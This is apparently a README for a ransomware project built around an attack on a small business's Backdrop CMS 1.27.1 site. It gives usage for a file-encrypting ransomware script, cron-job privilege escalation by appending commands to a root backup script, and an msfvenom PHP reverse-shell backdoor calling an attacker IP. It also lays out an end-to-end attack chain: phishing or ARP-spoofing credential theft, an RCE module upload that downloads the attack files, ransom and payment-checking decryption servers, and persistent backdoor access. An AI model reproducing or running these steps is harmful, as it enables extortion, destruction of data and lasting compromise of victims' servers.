# RansomwarePamela

How to run the encryption/ decryption with the shell file. 

./ransomware "mode" "traversing directory" "extentions" "key" "IV" 

- Mode: mode can be either encrypt or decrypt
- Traversing directory: This is the root directory you'd like the file to start searching in 
- Extentions: These are the extensions of the files you'd like to encrypt. Note that for multiple ones you have to put them with spaces in between. 
- Key: Is the key to encrypt and decrypt with 
- IV: Is the initial vector used in the AES algorithm.

Here you have an example for encryption and decryption. 
- Encryption: ./ransomware.sh "encrypt" "./target_directory" ".json .tsv .yaml" "00112233445566778899aabbccddeeff" "0102030405060708090a0b0c0d0e0f10" 
- Decryption: ./ransomware.sh "decrypt" "./target_directory" ".json .tsv .yaml" "00112233445566778899aabbccddeeff" "0102030405060708090a0b0c0d0e0f10"

Note, first run the encryption. 

How to do the privilege escalation using cron 
first we assume that the user ran these commands to have a frequent backup done: 
1. sudo crontab -e 
2. enter 1 
3. put the following line in the cronjob (this does the backup every 2 minutes)
    */2 * * * * cd "path to the directory" && ./backup.sh
   
Then as the attacker we run the following commands: 
1. In the same directory as the project run this: 
    echo "./ransomware.sh 'encrypt' './target_directory' '.json .tsv .yaml' '00112233445566778899aabbccddeeff' '0102030405060708090a0b0c0d0e0f10'" > input.sh
2. echo -e "chmod +x ransomware.sh \n chmod +x input.sh \n chmod +x backup.php \n ./input.sh \n rm input.sh" >> backup.sh


After the backup is done the script is also ran and the database is encrypted. 
We can further delete or encrypt the backup files as well.
If you want to stup the cron job run the command again and delete the added line.

To create the backdoor:
1. msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=4444 > backup.php (LHOST should be the IP of the attacker and the port is some arbitrary unused one)
2. Open the corresponding msfconsole and access the file remotely for which no admin access is needed- that starts the web shell and exploits the backdoor
=======

## CarDetailing Website Ransomware

### Story

Bob is a small business owner that specialises in car detailing. He has a simple website that allows customers to book their appointments and check information about the business. Because he is running on a small budget he didn't want to invest a lot of money in securing the website but rather have more functionality to serve the customers. Therefore, he hired a developer with the lowest bid he found on a website that offers different services. The website was developed using Backdrop, which is a free and Open Source Content Management System that helps you build modern, comprehensive websites on a reasonable budget. 

Alice a competitor of Bob wants to learn some information about his business model, clients and make some money out of it in the meantime. Therefore, she takes advantage of the vulnerability in Backdrop CMS 1.27.1 to install ransomware inside Bob's server.

#### Steps
This section entails the five steps to successfully achieve the goal of this project, including gaining admin access, run the exploit to import a malicious PHP module. Finally, install and run the ransomware on the target server.
  - Set up a website using Backdrop CMS 1.27.1, with a working database and basic functionality using Backdrop's installation guide here: https://docs.backdropcms.org/documentation/installation-instructions .
  -  Gain admin access to the website. This can be done with one of the following options, but we chose to go with the last one:
       - Brute force the credentials;
       - SQL Injection to bypass authentication;
       - Phishing : We could send him an email claiming that we are the person who was hired to develop the website. We will trick him using typosquatting in the email address and tell him that the website has a problem and he won't be able to serve his customers, so he needs to give us admin access to check it out.
       - Man in the middle attack: We trick the user into thinking he communicates directly with the server by spoofing the server's address and forwarding traffic. This way we intercept the login and steal their credentials.
- Use the exploit Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) here: https://www.exploit-db.com/exploits/52021 . It allows an authenticated user (admin) to upload a malicious PHP module that can execute arbitrary commands on the underlying server. 
- We can modify the malicious module to create a reverse shell to install the malware on the target server. 
- The installed malware encrypts all files in Bob's server and demands a ransom in return for the decryption key.
     when the ransom pops up on the screen, also does the rotating Pamela Anderson pictures in the background 

The reason why we need the exploit even though we have admin privileges is because Backdrop CMS limits uploading files that suspects might be malicious even for admins. So the exploit tricks it into thinking that the file is legitimate.


# Recreating the whole Ransomware Attack

To recreate the ransomware attack from end to end, follow these steps:

1. **Run the Webutler Web Server**  
   - Set up and run the Webutler web server on one machine.

2. **Network Spoofing**  
   - From the attacker's machine, connect to the network where the victim will log in.  
   - Spoof the address of the server and forward all traffic using tools like `arpspoof` and `mitmweb`.

3. **Intercept Login Request**  
   - Intercept the victim's login request and steal their credentials.

4. **Admin Access**  
   - Using the stolen credentials, log into the web server as an admin.

5. **Prepare Attack Files**  
   - Start a simple Python server on the attacker's machine at the location containing all files needed for the attack.

6. **Upload and Execute Attack Script**  
   - Upload a `.phar` file through the admin panel.  
   - The `.phar` file will automatically execute on the server, download the attack files, and update the backup script.  
   - At this point:
     - All database files on the server will be encrypted.
     - The webpage will display an updated ransom message.

7. **Setup Decryption Server**  
   - Configure a `server.php` file on the attacker's machine to manage the decryption key.  
   - This script will verify payment before sending the decryption key.

8. **Payment Verification**  
   - After the victim provides the payment reference, the attacker's server will verify it.  
   - Upon verification, the server will decrypt the files and delete all attack-related files except the `backup.php`.

9. **Backdoor Setup**  
   - The `backup.php` file will remain on the web server, creating a persistent backdoor.

10. **Backdoor Access**  
    - To utilize the backdoor, the attacker:
      - Starts an `msfconsole`.
      - Accesses the `backup.php` file on the server.
    - No admin access is needed as the file executes automatically, starting a reverse web shell.

Each time the backdoor is accessed, the attacker gains reverse shell access to the server.
!! Currently all the files are configured so that the attacker's IP address is 192.168.1.3 so make sure to update that accordingly, also in the backdoor file

